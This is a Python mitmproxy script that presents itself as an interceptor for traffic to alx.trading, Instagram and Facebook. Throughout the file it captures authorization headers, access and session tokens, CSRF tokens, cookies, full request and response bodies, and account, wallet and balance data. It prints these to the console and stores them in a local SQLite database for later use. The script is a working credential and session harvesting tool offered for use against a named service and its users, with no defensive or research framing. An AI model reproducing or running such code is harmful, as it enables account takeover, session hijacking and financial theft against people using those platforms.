#!/usr/bin/env python3
"""
🎯 ALX.TRADING TRAFFIC INTERCEPTOR
=================================
Specialized mitmproxy script for intercepting and analyzing alx.trading traffic
Captures sessions, cookies, API calls, and trading data
"""

from mitmproxy import http, ctx
import json
import sqlite3
from datetime import datetime
import re
import base64

class ALXTradingInterceptor:
    def __init__(self):
        self.session_data = {}
        self.api_calls = []
        self.cookies = {}
        
    def request(self, flow: http.HTTPFlow) -> None:
        """Intercept outgoing requests"""
        url = flow.request.pretty_url
        method = flow.request.method
        headers = dict(flow.request.headers)
        
        # Check if this is alx.trading related traffic
        if self.is_target_traffic(url):
            print(f"🎯 INTERCEPTED: {method} {url}")
            
            # Extract authentication data
            self.extract_auth_data(flow)
            
            # Extract session cookies
            self.extract_cookies(flow)
            
            # Log API calls
            if '/api/' in url or '/graphql' in url:
                self.log_api_call(flow)
            
            # Save to database
            self.save_request_to_db(flow)
    
    def response(self, flow: http.HTTPFlow) -> None:
        """Intercept incoming responses"""
        url = flow.request.pretty_url
        
        if self.is_target_traffic(url):
            print(f"📥 RESPONSE: {flow.response.status_code} from {url}")
            
            # Extract response data
            self.extract_response_data(flow)
            
            # Save response to database
            self.save_response_to_db(flow)
    
    def is_target_traffic(self, url: str) -> bool:
        """Check if URL is related to our targets"""
        targets = [
            'alx.trading',
            'instagram.com',
            'facebook.com',
            'api.instagram.com',
            'graph.instagram.com'
        ]
        return any(target in url.lower() for target in targets)
    
    def extract_auth_data(self, flow: http.HTTPFlow):
        """Extract authentication tokens and session data"""
        headers = dict(flow.request.headers)
        
        # Look for authorization headers
        auth_headers = ['authorization', 'x-auth-token', 'x-api-key', 'bearer']
        for header_name, header_value in headers.items():
            if any(auth in header_name.lower() for auth in auth_headers):
                print(f"🔐 AUTH HEADER: {header_name}: {header_value}")
                self.save_auth_data(header_name, header_value, flow.request.pretty_url)
        
        # Extract tokens from request body
        if flow.request.content:
            try:
                body = flow.request.content.decode('utf-8')
                # Look for common token patterns
                token_patterns = [
                    r'"access_token":\s*"([^"]+)"',
                    r'"token":\s*"([^"]+)"',
                    r'"sessionid":\s*"([^"]+)"',
                    r'"csrf_token":\s*"([^"]+)"'
                ]
                
                for pattern in token_patterns:
                    matches = re.findall(pattern, body)
                    for match in matches:
                        print(f"🎫 TOKEN FOUND: {match[:20]}...")
                        self.save_token(match, flow.request.pretty_url)
            except:
                pass
    
    def extract_cookies(self, flow: http.HTTPFlow):
        """Extract and store cookies"""
        if 'cookie' in flow.request.headers:
            cookie_header = flow.request.headers['cookie']
            print(f"🍪 COOKIES: {cookie_header}")
            
            # Parse cookies
            cookies = {}
            for cookie in cookie_header.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    cookies[name] = value
            
            self.cookies.update(cookies)
            self.save_cookies(cookies, flow.request.pretty_url)
    
    def log_api_call(self, flow: http.HTTPFlow):
        """Log API calls for analysis"""
        api_data = {
            'timestamp': datetime.now().isoformat(),
            'method': flow.request.method,
            'url': flow.request.pretty_url,
            'headers': dict(flow.request.headers),
            'body': None
        }
        
        if flow.request.content:
            try:
                api_data['body'] = flow.request.content.decode('utf-8')
            except:
                api_data['body'] = base64.b64encode(flow.request.content).decode('utf-8')
        
        self.api_calls.append(api_data)
        print(f"📡 API CALL LOGGED: {flow.request.method} {flow.request.pretty_url}")
    
    def extract_response_data(self, flow: http.HTTPFlow):
        """Extract valuable data from responses"""
        if flow.response.content:
            try:
                content = flow.response.content.decode('utf-8')
                
                # Look for JSON responses
                if flow.response.headers.get('content-type', '').startswith('application/json'):
                    try:
                        json_data = json.loads(content)
                        print(f"📊 JSON RESPONSE: {len(str(json_data))} chars")
                        
                        # Look for user data, trading data, etc.
                        self.extract_trading_data(json_data, flow.request.pretty_url)
                    except:
                        pass
                
                # Look for HTML with embedded data
                if 'text/html' in flow.response.headers.get('content-type', ''):
                    # Extract JavaScript variables or window.__data__ objects
                    js_data_patterns = [
                        r'window\.__data__\s*=\s*({.+?});',
                        r'window\.initialData\s*=\s*({.+?});',
                        r'var\s+userData\s*=\s*({.+?});'
                    ]
                    
                    for pattern in js_data_patterns:
                        matches = re.findall(pattern, content, re.DOTALL)
                        for match in matches:
                            print(f"🎯 EMBEDDED DATA FOUND: {len(match)} chars")
                            try:
                                data = json.loads(match)
                                self.extract_trading_data(data, flow.request.pretty_url)
                            except:
                                pass
            except:
                pass
    
    def extract_trading_data(self, data: dict, url: str):
        """Extract trading-specific data"""
        # Look for common trading data patterns
        trading_keys = [
            'balance', 'portfolio', 'positions', 'trades', 'orders',
            'wallet', 'account', 'profile', 'settings', 'preferences'
        ]
        
        for key in trading_keys:
            if key in str(data).lower():
                print(f"💰 TRADING DATA DETECTED: {key} in response from {url}")
                # Save important trading data
                self.save_trading_data(key, data, url)
    
    def save_auth_data(self, header_name: str, header_value: str, url: str):
        """Save authentication data to database"""
        try:
            conn = sqlite3.connect('data/intercepted_data.db')
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS auth_data 
                        (timestamp TEXT, header_name TEXT, header_value TEXT, url TEXT)''')
            c.execute('INSERT INTO auth_data VALUES (?, ?, ?, ?)',
                     (datetime.now().isoformat(), header_name, header_value, url))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"❌ Database error: {e}")
    
    def save_token(self, token: str, url: str):
        """Save tokens to database"""
        try:
            conn = sqlite3.connect('data/intercepted_data.db')
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS tokens 
                        (timestamp TEXT, token TEXT, url TEXT)''')
            c.execute('INSERT INTO tokens VALUES (?, ?, ?)',
                     (datetime.now().isoformat(), token, url))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"❌ Database error: {e}")
    
    def save_cookies(self, cookies: dict, url: str):
        """Save cookies to database"""
        try:
            conn = sqlite3.connect('data/intercepted_data.db')
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS cookies 
                        (timestamp TEXT, name TEXT, value TEXT, url TEXT)''')
            for name, value in cookies.items():
                c.execute('INSERT INTO cookies VALUES (?, ?, ?, ?)',
                         (datetime.now().isoformat(), name, value, url))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"❌ Database error: {e}")
    
    def save_request_to_db(self, flow: http.HTTPFlow):
        """Save request details to database"""
        try:
            conn = sqlite3.connect('data/intercepted_data.db')
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS requests 
                        (timestamp TEXT, method TEXT, url TEXT, headers TEXT, body TEXT)''')
            
            body = None
            if flow.request.content:
                try:
                    body = flow.request.content.decode('utf-8')
                except:
                    body = base64.b64encode(flow.request.content).decode('utf-8')
            
            c.execute('INSERT INTO requests VALUES (?, ?, ?, ?, ?)',
                     (datetime.now().isoformat(), flow.request.method, 
                      flow.request.pretty_url, json.dumps(dict(flow.request.headers)), body))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"❌ Database error: {e}")
    
    def save_response_to_db(self, flow: http.HTTPFlow):
        """Save response details to database"""
        try:
            conn = sqlite3.connect('data/intercepted_data.db')
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS responses 
                        (timestamp TEXT, url TEXT, status_code INTEGER, headers TEXT, body TEXT)''')
            
            body = None
            if flow.response.content:
                try:
                    body = flow.response.content.decode('utf-8')
                except:
                    body = base64.b64encode(flow.response.content).decode('utf-8')
            
            c.execute('INSERT INTO responses VALUES (?, ?, ?, ?, ?)',
                     (datetime.now().isoformat(), flow.request.pretty_url, 
                      flow.response.status_code, json.dumps(dict(flow.response.headers)), body))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"❌ Database error: {e}")
    
    def save_trading_data(self, data_type: str, data: dict, url: str):
        """Save trading-specific data"""
        try:
            conn = sqlite3.connect('data/intercepted_data.db')
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS trading_data 
                        (timestamp TEXT, data_type TEXT, data TEXT, url TEXT)''')
            c.execute('INSERT INTO trading_data VALUES (?, ?, ?, ?)',
                     (datetime.now().isoformat(), data_type, json.dumps(data), url))
            conn.commit()
            conn.close()
            print(f"💾 SAVED TRADING DATA: {data_type}")
        except Exception as e:
            print(f"❌ Database error: {e}")

# Initialize the interceptor
addons = [ALXTradingInterceptor()]

if __name__ == "__main__":
    print("🎯 ALX.TRADING TRAFFIC INTERCEPTOR LOADED")
    print("="*50)
    print("📡 Ready to intercept and analyze traffic")
    print("🎯 Targeting: alx.trading, Instagram, Facebook")
    print("💾 Data saved to: data/intercepted_data.db")
    print("🌐 Use: mitmdump -s alx_trading_interceptor.py")
